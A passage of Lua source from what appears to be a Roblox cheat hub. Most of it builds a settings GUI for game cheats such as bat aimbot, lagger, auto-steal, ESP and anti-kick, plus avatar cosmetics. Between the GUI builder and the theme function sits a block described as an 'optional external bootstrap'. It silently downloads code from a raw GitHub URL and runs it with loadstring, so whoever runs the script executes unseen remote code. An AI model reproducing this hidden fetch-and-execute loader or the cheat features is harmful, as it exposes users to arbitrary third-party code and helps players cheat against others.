        if M.mobileButtonsEnabled then M.buildMobileButtons() end
        saveCherryConfig()
    end)

    uiActionRow(PBtn, "Reset Buttons Position", function()
        if M.resetMobilePositions then M.resetMobilePositions() end
    end)

    uiSectionHeader(PBtn, "SHOW / HIDE BUTTONS")
    if type(M.mobileBtnVisible) ~= "table" then M.mobileBtnVisible = {} end
    local btnVisLabels = {
        {key="autoLeft", label="Auto Left"},
        {key="autoRight", label="Auto Right"},
        {key="autoBat", label="Bat Aimbot"},
        {key="batTP", label="Bat TP"},
        {key="drop", label="Drop"},
        {key="tpDown", label="TP Down"},
        {key="reset", label="Insta Reset"},
        {key="lagger", label="Lagger Normal"},
        {key="laggerCarry", label="Lagger Carry"},
        {key="carrySpeed", label="Carry Mode"},
    }
    for _, item in ipairs(btnVisLabels) do
        if M.mobileBtnVisible[item.key] == nil then M.mobileBtnVisible[item.key] = true end
        local k = item.key
        uiToggleRow(PBtn, item.label, M.mobileBtnVisible[k] ~= false, function(on)
            M.mobileBtnVisible[k] = on == true
            pcall(function() if M.saveBtnPositions then M.saveBtnPositions() end end)
            if M.mobileButtonsEnabled and M.buildMobileButtons then
                M.buildMobileButtons()
            end
            saveCherryConfig()
        end)
    end

    -- Anti Die / Anti Fling removed completely
    M.setAntiDieVisual = function() end
    M.setAntiDieFlingVisual = function() end
    M.setAntiFlingVisual = function() end

    local _, setAntiSummer = uiToggleRow(PUtil, "Anti Summer Base", M.antiSummerBaseEnabled == true, function(on)
        if on then
            if M.enableAntiSummerBase then M.enableAntiSummerBase() end
        else
            if M.disableAntiSummerBase then M.disableAntiSummerBase() end
        end
        M.antiSummerBaseEnabled = on == true
        saveCherryConfig()
    end)
    M.setAntiSummerBaseVisual = setAntiSummer

    uiSectionHeader(PUtil, "CHARTER")
    local _, setUnwalk = uiToggleRow(PUtil, "Unwalk", M.unwalkEnabled == true, function(on)
        if on then

            M.animPackEnabled = false
            M.animPack = nil
            if M.animPackLabel then pcall(function() M.animPackLabel.Text = "Off" end) end
            if M.setVampireAnimVisual then M.setVampireAnimVisual(false) end
            if M.setAmazonAnimVisual then M.setAmazonAnimVisual(false) end
            if M.setZombieAnimVisual then M.setZombieAnimVisual(false) end
            if M.setTryhardAnimVisual then M.setTryhardAnimVisual(false) end
            M.unwalkEnabled = true
            M.startUnwalk()
        else

            M.unwalkEnabled = false
            M.stopUnwalk()
            if not (M.animPackEnabled and M.animPack) then
                if player.Character and M.forceVanillaAnimate then
                    pcall(function() M.forceVanillaAnimate(player.Character) end)
                end
            end
        end
        saveCherryConfig()
    end)
    M.setUnwalkVisual = setUnwalk

    -- Animation pack as selector (like Skin Pack)
    do
        local r = Instance.new("Frame")
        r.ClipsDescendants = true
        r.Size = UDim2.new(1, 0, 0, 46)
        r.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        r.BackgroundTransparency = 0.03
        r.BorderSizePixel = 0
        r.Parent = PUtil
        uiCardStyle(r)
        local l = Instance.new("TextLabel")
        l.Position = UDim2.new(0, 14, 0, 0)
        l.Size = UDim2.new(0.38, 0, 1, 0)
        l.BackgroundTransparency = 1
        l.Text = "Animation"
        l.TextColor3 = UI_TEXT_PRIMARY
        l.TextSize = 14
        l.Font = Enum.Font.GothamMedium
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = r

        local container = Instance.new("Frame", r)
        container.Size = UDim2.new(0, 168, 0, 28)
        container.Position = UDim2.new(1, -176, 0.5, -14)
        container.BackgroundTransparency = 1
        container.ZIndex = 8

        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 28, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        leftBtn.Font = Enum.Font.GothamBlack
        leftBtn.TextSize = 14
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)

        local nameLbl = Instance.new("TextLabel", container)
        nameLbl.Size = UDim2.new(0, 104, 0, 26)
        nameLbl.Position = UDim2.new(0, 32, 0.5, -13)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = (M.animPackEnabled and M.animPack) or "Off"
        nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLbl.Font = Enum.Font.GothamBlack
        nameLbl.TextSize = 11
        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
        nameLbl.ZIndex = 9
        M.animPackLabel = nameLbl

        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 28, 0, 26)
        rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
        rightBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        rightBtn.Font = Enum.Font.GothamBlack
        rightBtn.TextSize = 14
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)

        leftBtn.MouseButton1Click:Connect(function() M.cycleAnimPack(-1) end)
        rightBtn.MouseButton1Click:Connect(function() M.cycleAnimPack(1) end)
    end
    -- compatibility stubs for old visual setters
    M.setVampireAnimVisual = function() end
    M.setAmazonAnimVisual = function() end
    M.setZombieAnimVisual = function() end
    M.setTryhardAnimVisual = function() end

    uiSectionHeader(PUtil, "AVATAR")

    local _, setHeadless = uiToggleRow(PUtil, "Headless", M.headlessEnabled == true, function(on)
        M.headlessEnabled = on
        if player.Character then
            pcall(function() M.applyHeadlessToChar(player.Character, on) end)
            pcall(function() M.applyCharterToChar(player.Character) end)
        end
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)
    M.setHeadlessVisual = setHeadless

    local _, setKorblox = uiToggleRow(PUtil, "Korblox", M.korbloxEnabled == true, function(on)
        M.korbloxEnabled = on
        if player.Character then
            pcall(function() M.applyKorbloxToChar(player.Character, on) end)
            pcall(function() M.applyCharterToChar(player.Character) end)
        end
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)
    M.setKorbloxVisual = setKorblox

    do
        local r = Instance.new("Frame")
        r.ClipsDescendants = true
        r.Size = UDim2.new(1, 0, 0, 46)
        r.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        r.BackgroundTransparency = 0.03
        r.BorderSizePixel = 0
        r.Parent = PUtil
        uiCardStyle(r)
        local l = Instance.new("TextLabel")
        l.Position = UDim2.new(0, 14, 0, 0)
        l.Size = UDim2.new(0.4, 0, 1, 0)
        l.BackgroundTransparency = 1
        l.Text = "Skin Pack"
        l.TextColor3 = UI_TEXT_PRIMARY
        l.TextSize = 14
        l.Font = Enum.Font.GothamMedium
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = r

        local container = Instance.new("Frame", r)
        container.Size = UDim2.new(0, 160, 0, 28)
        container.Position = UDim2.new(1, -168, 0.5, -14)
        container.BackgroundTransparency = 1
        container.ZIndex = 8

        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 28, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        leftBtn.Font = Enum.Font.GothamBlack
        leftBtn.TextSize = 14
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)

        local nameLbl = Instance.new("TextLabel", container)
        nameLbl.Size = UDim2.new(0, 96, 0, 26)
        nameLbl.Position = UDim2.new(0, 32, 0.5, -13)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = M.skinPack or "Off"
        nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLbl.Font = Enum.Font.GothamBlack
        nameLbl.TextSize = 11
        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
        nameLbl.ZIndex = 9
        M.skinPackLabel = nameLbl

        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 28, 0, 26)
        rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
        rightBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        rightBtn.Font = Enum.Font.GothamBlack
        rightBtn.TextSize = 14
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)

        leftBtn.MouseButton1Click:Connect(function() M.cycleSkinPack(-1) end)
        rightBtn.MouseButton1Click:Connect(function() M.cycleSkinPack(1) end)
    end


    do
        local r = Instance.new("Frame")
        r.ClipsDescendants = true
        r.Size = UDim2.new(1, 0, 0, 46)
        r.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        r.BackgroundTransparency = 0.03
        r.BorderSizePixel = 0
        r.Parent = PUtil
        uiCardStyle(r)
        local l = Instance.new("TextLabel")
        l.Position = UDim2.new(0, 14, 0, 0)
        l.Size = UDim2.new(0.38, 0, 1, 0)
        l.BackgroundTransparency = 1
        l.Text = "UI Layout"
        l.TextColor3 = UI_TEXT_PRIMARY
        l.TextSize = 14
        l.Font = Enum.Font.GothamMedium
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = r

        local container = Instance.new("Frame", r)
        container.Size = UDim2.new(0, 180, 0, 28)
        container.Position = UDim2.new(1, -188, 0.5, -14)
        container.BackgroundTransparency = 1
        container.ZIndex = 8

        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 28, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        leftBtn.Font = Enum.Font.GothamBlack
        leftBtn.TextSize = 14
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)

        local nameLbl = Instance.new("TextLabel", container)
        nameLbl.Size = UDim2.new(0, 116, 0, 26)
        nameLbl.Position = UDim2.new(0, 32, 0.5, -13)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = M.uiLayoutMode or "Vertical Top"
        nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLbl.Font = Enum.Font.GothamBlack
        nameLbl.TextSize = 10
        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
        nameLbl.ZIndex = 9
        M.uiLayoutLabel = nameLbl

        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 28, 0, 26)
        rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
        rightBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        rightBtn.Font = Enum.Font.GothamBlack
        rightBtn.TextSize = 14
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)

        leftBtn.MouseButton1Click:Connect(function() M.cycleUiLayout(-1) end)
        rightBtn.MouseButton1Click:Connect(function() M.cycleUiLayout(1) end)
    end



    M.headlessEnabled = M.headlessEnabled == true
    M.korbloxEnabled = M.korbloxEnabled == true
    M.vynxBlackSkinEnabled = false
    if player.Character then
        pcall(function() M.applyCharterToChar(player.Character) end)
    end

    uiSectionHeader(PUtil, "PANELS")

    M.pingAlertEnabled = false
    pcall(function() if M.stopPingAlert then M.stopPingAlert() end end)

    M.killLaggerOpen = false
M.bypassPanelOpen = false
M.bypassBgIndex = tonumber(M.bypassBgIndex) or 1
M.bypassOnSteal = false
M.bypassKeybindName = M.bypassKeybindName or "G"
    uiActionRow(PUtil, "Reset Panel Positions", function()
        M.resetPanelPositions()
    end)
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Save Config"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local sBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="SAVE", Col=Color3.fromRGB(40, 40, 40), TS=12, CR=6, SC=Color3.fromRGB(0, 0, 0), STr=0.2})
        sBtn.Activated:Connect(function()
            pcall(function()
                if M.saveBtnPositions then M.saveBtnPositions() end
                saveCherryConfig()
            end)
            sBtn.Text = "OK"
            task.delay(0.8, function() if sBtn and sBtn.Parent then sBtn.Text = "SAVE" end end)
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Reset All Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local rBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="RESET", Col=Color3.fromRGB(40, 40, 40), TS=12, CR=6, SC=Color3.fromRGB(0, 0, 0), STr=0.2})
        rBtn.Activated:Connect(function() M.resetAllSettings() end)
    end

    uiSectionHeader(PKB, "KEYBINDS")
    uiKeybindRow(PKB, "Hide GUI", M.KB.GuiHide, "GuiHide")
    uiKeybindRow(PKB, "Normal [Speed Custom]", M.KB.SpeedToggle, "SpeedToggle")
    uiKeybindRow(PKB, "Lagger Toggle [Speed Custom]", M.KB.LaggerToggle, "LaggerToggle")
    uiKeybindRow(PKB, "Lagger Carry", M.KB.LaggerCarry, "LaggerCarry")
    uiKeybindRow(PKB, "Bat Aimbot", M.KB.AutoBat, "AutoBat")
    uiKeybindRow(PKB, "Bat TP", M.KB.BatTP, "BatTP")
    uiKeybindRow(PKB, "Auto Left", M.KB.AutoLeft, "AutoLeft")
    uiKeybindRow(PKB, "Auto Right", M.KB.AutoRight, "AutoRight")
    uiKeybindRow(PKB, "Drop Brainrot", M.KB.DropBrainrot, "DropBrainrot")
    uiKeybindRow(PKB, "TP Down", M.KB.TPFloor, "TPFloor")
    uiKeybindRow(PKB, "Insta Reset", M.KB.InstaReset, "InstaReset")

    do
        M.menuOpen = true
        Frame.Visible = true
        MinPill.Visible = false
    end

    M.applyStealBarTheme(CHERRY_ACCENT)
    M.updateHeadTheme()
    pcall(function() if M.applyChromeTheme then M.applyChromeTheme() end end)
    M.applyFOV()

    task.spawn(function()
        local last = tick()
        local frames = 0
        local fps = 60
        RunService.Heartbeat:Connect(function()
            frames = frames + 1
            local now = tick()
            if now - last >= 0.75 then
                fps = math.floor(frames / (now - last) + 0.5)
                frames = 0
                last = now
                local ping = 0
                pcall(function()
                    ping = math.floor(player:GetNetworkPing() * 1000 + 0.5)
                end)
                if M.headerStatsLbl then
                    M.headerStatsLbl.Text = string.format("FPS: %d  |  MS: %d", fps, ping)
                end
                if M.headerFpsLbl then
                    M.headerFpsLbl.Text = string.format("FPS: %d  |  MS: %d", fps, ping)
                end
                if M.headerMsLbl and M.headerMsLbl.Visible then
                    M.headerMsLbl.Text = string.format("MS: %d", ping)
                end
                if M.headerRadiusLbl and M.getActiveStealRadius then
                    M.headerRadiusLbl.Text = tostring(M.getActiveStealRadius())
                end
            end
        end)
    end)

    M.autoTPHeightBox = tpHBox
    M.radInput = srBox
    M.durationBox = sdBox
    M.btnSzBox = btnSzBox
    M.sbBox = sbBox

    if M.setAntiRagVisual then M.setAntiRagVisual(M.antiRagdollEnabled) end
    if M.setAntiFlingVisual then M.setAntiFlingVisual(M.antiFlingEnabled == true) end
    if M.setSafeModeVisual then M.setSafeModeVisual(M.safeModeEnabled) end
    if M.setAutoCarryVisual then M.setAutoCarryVisual(M.autoSwitchSpeedEnabled) end
    if M.setCircleBtnsVisual then M.setCircleBtnsVisual(M.circleButtonsEnabled) end
    if M.safeModeEnabled then M.enableSafeMode() end
    M.antiKickEnabled = false

    if M.setAntiRagModeUI then M.setAntiRagModeUI(M.antiRagdollMode == "No Splatter" and "No Splatter" or "Splatter") end
    if M.setInfJumpVisual then M.setInfJumpVisual(M.infJumpEnabled) end
    if M.setMedusaVisual then M.setMedusaVisual(M.medusaCounterEnabled) end
    if M.setBatCounterVisual then M.setBatCounterVisual(M.batCounterEnabled) end
    if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled) end
    if M.setStretchVisual then pcall(function() M.setStretchVisual(M.stretchEnabled == true) end) end
    if M.antiLagEnabled then pcall(function() if M.enableAntiLag then M.enableAntiLag() end end) end
    if M.stretchEnabled then pcall(function() if M.enableStretchRez then M.enableStretchRez() end end) end
    if M.setDawgOptimizerVisual then M.setDawgOptimizerVisual(M.dawgOptimizerEnabled) end
    if M.setAutoTPVisual then M.setAutoTPVisual(M.autoTPEnabled) end
    if M.setInstaGrab then M.setInstaGrab(M.Steal.AutoStealEnabled) end
    if M.setAutoRadiusVisual then M.setAutoRadiusVisual(M.autoRadiusEnabled) end
    if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
    if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
    if M.setAutoSwingVisual then M.setAutoSwingVisual(M.autoSwingEnabled) end
    if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end

    if player.Character then pcall(function() M.applyCharterToChar(player.Character) end) end
    if M.setStealModeUI then
        M.stealMode = "V2"
        M.setStealModeUI("V2")
    end
    if M.setJumpModeUI then M.setJumpModeUI(M.infJumpMode == "hold" and "Hold" or "Manual") end
    if M.setTpBatModeUI then M.setTpBatModeUI(M.batTPVersion or "V1") end
    if M.setVampireAnimVisual then M.setVampireAnimVisual(M.animPackEnabled and M.animPack == "Vampire") end
    if M.setAmazonAnimVisual then M.setAmazonAnimVisual(M.animPackEnabled and M.animPack == "Amazon Unboxed") end
    if M.setZombieAnimVisual then M.setZombieAnimVisual(M.animPackEnabled and M.animPack == "Zombie") end
    if M.setTryhardAnimVisual then M.setTryhardAnimVisual(M.animPackEnabled and M.animPack == "Tryhard") end
    if M.setUnwalkVisual then M.setUnwalkVisual(M.unwalkEnabled == true) end

    task.defer(function()
        pcall(function() M.applyWalkState(player.Character) end)
    end)

    cherryESPState.LineESP = M.lineESPEnabled
    cherryESPState.SpeedESP = M.speedESPEnabled
    cherryESPState.HighlightESP = false
    M.highlightESPEnabled = false

    M.updateStatusRadius()
    M.startHeadSpeedUpdates()
    pcall(function()
        if M.mainFrame then M.mainFrame.Visible = true end
        if M.gui then M.gui.Enabled = true end
        M.menuOpen = true
    end)
    M._buildingGui = false
    print("[VYNX] buildGui finished, gui=", M.gui ~= nil, "mainFrame=", M.mainFrame ~= nil)
end
pcall(function()
    -- optional external bootstrap; never block or kill the hub if it fails
    local src = nil
    local okGet, res = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/k62488344-ux/idkz/main/idkz", true)
    end)
    if okGet and type(res) == "string" and #res > 10 then src = res end
    if src then
        local fn, err = loadstring(src)
        if fn then pcall(fn) end
    end
end)
function M.applyStealBarTheme(accentColor)
    local acc = accentColor
    if typeof(acc) ~= "Color3" then
        acc = (M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200)
    end

    if M.statusFill then
        pcall(function()
            M.statusFill.BackgroundColor3 = acc
            local sh = M.statusFill:FindFirstChild("FillShine")
            if sh then sh.BackgroundColor3 = acc:Lerp(Color3.fromRGB(255, 255, 255), 0.4) end
            local hl = M.statusFill:FindFirstChild("FillHighlight")
            if hl then hl.BackgroundColor3 = acc:Lerp(Color3.fromRGB(255, 255, 255), 0.7) end
        end)
    end

    local hud = M.statusHolder or M.statusMain
    if hud and hud.Parent then
        pcall(function()
            hud.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            -- strip any contours
            for _, d in ipairs(hud:GetDescendants()) do
                if d:IsA("UIStroke") then d:Destroy() end
            end
            local st = hud:FindFirstChildOfClass("UIStroke")
            if st then st:Destroy() end
            local track = hud:FindFirstChild("StealTrack", true)
            if track then track.BackgroundColor3 = Color3.fromRGB(0, 0, 0) end
        end)
    end

    if M.statusPctLbl then
        pcall(function() M.statusPctLbl.TextColor3 = Color3.fromRGB(255, 255, 255) end)
    end
    if M.statusRadiusLbl then
        pcall(function() M.statusRadiusLbl.TextColor3 = Color3.fromRGB(255, 255, 255) end)
    end
    if M.statusInfoLbl then
        pcall(function() M.statusInfoLbl.TextColor3 = Color3.fromRGB(165, 185, 205) end)
    end
end

function M.resetAllSettings()
    M.NS = 60
    M.CS = 30
    M.LAGGER_SPEED = 22
    M.LAGGER_CARRY_SPEED = 22
    M.BYPASS_SPEED = 40
    M.BYPASS_CARRY_SPEED = 22
    M.speedMethod = "LinearVelocity"
    M.hyperMult = 4
    M._lastSpeedMethod = nil
    M._anchoredBySpeed = nil
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    M.antiRagdollEnabled = false
M.hardHitEnabled = false
M.hardHitRadius = 10
    M.antiRagdollMode = "Splatter"
    M.infJumpEnabled = false
    M.infJumpMode = "manual"
    M.medusaCounterEnabled = false
    M.batCounterEnabled = false
    M.unwalkEnabled = false
    M.medusaResetEnabled = false
    M.medusaDebounce = false
    M.medusaLastUsed = 0
    M.autoLeftEnabled = false
    M.autoRightEnabled = false
    M.autoBatEnabled = false
    M.autoSwingEnabled = true
    M.autoMoveSwingEnabled = false
    -- keep M.antiLagEnabled / M.stretchEnabled from loaded config
    M.removeAccessoriesEnabled = false
    M.autoTPEnabled = false
    M.autoTPHeight = 20
    M.guiTransparencyEnabled = false
    M.mobileButtonsEnabled = true
    M.mobileButtonsSize = 60
    M.circleButtonsEnabled = false
    M.fovValue = 80
    M.fovIndex = 1
    M.autoSwitchSpeedEnabled = false
    M.antiKickEnabled = false
    M.brainrotDetected = false
    M.ragdollGuiEnabled = true
    M.introSoundEnabled = false
    M.introSongChoice = 3
    M.introGUIEnabled = false -- permanently off
    M.Steal.AutoStealEnabled = false
    M.autoRadiusEnabled = false
    M.Steal.StealRadius = 61
    M.Steal.StealDuration = 1.3
    M.Steal.StopTime = 0.35
    M.stealMode = "V2"
    M.Semi.holdMin = 1.3
    M.Semi.holdMax = 2.6
    M.Semi.entryDelay = 0.3
    M.Semi.radius = 10
    M.Semi.primeRange = 80
    M.removeAccEnabled = false
    M.playerESPEnabled = false
    M.showPlayerSpeeds = false
    M.uiScale = 0.6
    M.perButtonDragEnabled = true
    M.stealBarStyle = "New"
    M.stealBarSize = 400
    M.lineESPEnabled = false
    M.speedESPEnabled = false
    M.uiColorName = "Ocean"
    pcall(function() if M.setUiColor then M.setUiColor("Ocean") end end)
    M.antiSummerBaseEnabled = false
    pcall(function() if M.disableAntiSummerBase then M.disableAntiSummerBase() end end)
    M.noPlayerCollisionEnabled = false
    pcall(function() if M.disableNoPlayerCollision then M.disableNoPlayerCollision() end end)
    M.autoResetOnDeath = false
    M.animPack = nil
    M.headlessEnabled = false
    M.korbloxEnabled = false
    M.vynxBlackSkinEnabled = false
    M.bypassAimbotEnabled = false
    M.antiFlingEnabled = true
    if M.startAntiFling then pcall(M.startAntiFling) end
    M.animPackEnabled = false
    M.unwalkEnabled = false
    M.antiLagEnabled = false

    M.stopAutoSteal()
    M.stopBatAimbot()
    M.stopAutoLeft()
    M.stopAutoRight()
    M.stopAntiRagdoll()
    M.stopHoldInfJump()
    M.stopManualInfJumpLoop()
    M.stopMedusaCounter()
    M.stopBatCounter()
    M.stopUnwalk()
    M.antiLagEnabled = false
    M.stopAutoTP()
    M.disableAntiKick()
    M.stopBypassAimbot()
    M.stopRemoveAcc()
    M.toggleESP(false)
    M.togglePlayerSpeeds(false)
    M.autoResetOnDeath = false
    setupDeathReset()

    saveCherryConfig()
    M.buildGui()
end

function M.loadMainUIAfterIntro()
    M._introUIReady = true
    M._pendingBuildGui = false
    M._pendingMobileButtons = false
    if M._mainUILoadedAfterIntro and M.gui and M.gui.Parent then return end
    M._mainUILoadedAfterIntro = true
    pcall(function()
        M.buildGui()
    end)
    if not (M.gui and M.gui.Parent) then
        -- retry once if first build failed
        task.defer(function()
            task.wait(0.5)
            M._introUIReady = true
            M._buildingGui = false
            pcall(function() M.buildGui() end)
        end)
    end
    pcall(function() if M.applyOceanSky then M.applyOceanSky() end end)
    pcall(function()
        if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
        if M.updateHeadTheme then M.updateHeadTheme() end
        if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
    end)
    if M.mobileButtonsEnabled and M.buildMobileButtons then
        pcall(function() M.buildMobileButtons() end)
    end
end

M.wornAvatar = M.wornAvatar or nil
M.avLogOutfitEnabled = M.avLogOutfitEnabled == true
M._avLogSpinners = M._avLogSpinners or {}
M._avLogConn = nil
M._avLogWin = nil
M._avLogWinBig = nil
M._avLogFolderInst = nil
M._avLogApplying = false
M._avLogSavedDesc = nil
M._avLogBodyOrig = {}

local AVLOG_BASE = Vector3.new(0, 600, 0)
local AVLOG_ACCENT = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
local AVLOG_WHITE = Color3.fromRGB(255, 255, 255)
local AVLOG_DIM = Color3.fromRGB(150, 150, 158)
local AVLOG_WIN_BG = Color3.fromRGB(13, 14, 17)
local AVLOG_ROW_BG = Color3.fromRGB(20, 20, 24)
local AVLOG_BTN_BG = Color3.fromRGB(0, 0, 0)
local AVLOG_STROKE = Color3.fromRGB(66, 66, 66)
local AVLOG_VIEW_BG = Color3.fromRGB(22, 24, 30)



-- Katana and Head Skin fully removed from script



-- Safe no-ops (katana / head skin eliminated)
function M.applyKatana(...) end
function M.cycleKatana(...) end
function M._destroyKatana(...) end
function M._buildHandWeaponModel(...) return nil end
function M.applyHeadSkin(...) end
function M.cycleHeadSkin(...) end
function M._clearHeadSkin(...) end
M.katanaEnabled = false
M.katanaType = "Off"
M.headSkin = "Off"

M.AVLOG_RARE = {
    {name="Dominus King",    value="40M+ R$", bodyColor="Really black",        hat=21070012,   shirt=915027647, pants=398633812, body="buff", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(70,25,105), pantsColor=Color3.fromRGB(22,22,26),   headless=true, korblox=true, hatColor=Color3.fromRGB(70,25,105),  sparkle={255,210,90}},
    {name="Infernus Lord",   value="70M+ R$", bodyColor="Really black",        hat=31101391,   shirt=430319499, pants=398633812, body="buff", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(30, 100, 220), pantsColor=Color3.fromRGB(22,22,26),   headless=true, korblox=true, hatColor=Color3.fromRGB(30, 100, 220),  sparkle={255,80,40}},
    {name="Valkyrie Legend", value="300K R$", bodyColor="Institutional white", hat=1365767,    shirt=1110978443, pants=398633812, body="classic", skin=Color3.fromRGB(242,238,228), shirtColor=Color3.fromRGB(222,192,110), pantsColor=Color3.fromRGB(230,230,236),    headless=true, korblox=true, hatColor=Color3.fromRGB(222,192,110), sparkle={255,230,150}},
    {name="Domino Crown",    value="150K R$", bodyColor="Institutional white", hat=4390890198, shirt=855766176, pants=144076760, body="slim", skin=Color3.fromRGB(242,238,228), shirtColor=Color3.fromRGB(88,222,138), pantsColor=Color3.fromRGB(30,92,54), headless=true, korblox=true, hatColor=Color3.fromRGB(88,222,138), sparkle={160,255,190}},
    {name="Horned Demon",    value="1M+ R$",  bodyColor="Really black",        horns=6065492018, shirt=855776103, pants=398633812, body="buff", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(45, 160, 255), pantsColor=Color3.fromRGB(22,22,26), hornColor=Color3.fromRGB(58,58,64), headless=true, korblox=true, sparkle={255,45,45}},
